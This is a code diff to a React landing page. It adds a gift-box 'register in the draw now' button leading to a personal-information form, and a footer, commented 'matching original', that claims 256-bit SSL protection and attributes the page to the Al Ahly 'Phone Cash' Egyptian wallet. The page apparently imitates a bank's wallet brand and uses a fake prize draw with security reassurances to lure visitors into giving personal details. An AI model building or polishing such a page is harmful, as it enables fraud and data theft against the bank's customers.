@@ -49,13 +49,14 @@ export default function HomePage() {
             </p>
           </div>
 
-          {/* Register Button */}
+          {/* Register Button with gift box icon */}
           <button
             onClick={() => setLocation("/personal-info")}
-            className="w-full bg-gradient-to-l from-[#1a4d2e] to-[#2d6b3f] hover:from-[#163f26] hover:to-[#245a34] text-white font-bold py-4 px-6 rounded-xl transition-all duration-300 transform hover:scale-[1.02] active:scale-[0.98] shadow-lg hover:shadow-xl text-lg"
+            className="w-full bg-gradient-to-l from-[#1a4d2e] to-[#2d6b3f] hover:from-[#163f26] hover:to-[#245a34] text-white font-bold py-4 px-6 rounded-xl transition-all duration-300 transform hover:scale-[1.02] active:scale-[0.98] shadow-lg hover:shadow-xl text-lg flex items-center justify-center gap-3"
             style={{ fontFamily: "'Tajawal', sans-serif" }}
           >
-            سجل الآن
+            <span className="text-2xl">🎁</span>
+            <span>سجل في السحب الان</span>
           </button>
 
           <p className="text-center text-gray-400 text-xs mt-4" style={{ fontFamily: "'Tajawal', sans-serif" }}>
@@ -63,12 +64,14 @@ export default function HomePage() {
           </p>
         </div>
 
-        {/* SSL Footer */}
-        <div className="mt-6 flex items-center gap-2 text-green-200/70">
-          <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+        {/* SSL Footer - matching original */}
+        <div className="mt-6 flex items-center justify-center gap-2 text-green-200/80">
+          <svg className="w-4 h-4 text-yellow-400" fill="currentColor" viewBox="0 0 20 20">
             <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
           </svg>
-          <span className="text-xs" style={{ fontFamily: "'Tajawal', sans-serif" }}>اتصال آمن ومشفر SSL</span>
+          <span className="text-xs" style={{ fontFamily: "'Tajawal', sans-serif" }}>
+            محمي بتشفير SSL 256-bit | محفظة الاهلي فون كاش المصري © 2024
+          </span>
         </div>
       </div>
     </div>
